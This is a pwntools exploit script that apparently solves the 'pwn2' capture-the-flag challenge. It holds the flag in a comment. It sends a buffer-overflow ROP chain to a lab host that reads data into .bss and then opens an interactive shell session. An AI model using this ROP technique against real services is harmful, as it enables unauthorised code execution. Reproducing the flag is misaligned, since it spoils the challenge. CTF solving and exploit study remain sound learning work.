#!/usr/bin/env python
from pwn import *
import time

# EOF{BoOof_for_Ch1ldrens}

e = ELF('./pwn2')

context.arch = 'amd64'
host , port = '10.140.0.8' , 11112
y = remote( host , port )

pop_rdi = 0x4006d3
ppr = 0x4006d1

p = flat(
    'a' * 0x10,
    pop_rdi,
    0,
    ppr,
    e.bss() + 0x100,
    0,
    e.plt['read'],
    pop_rdi,
    e.bss() + 0x100,
    0x400602
)
y.send( p )

y.interactive()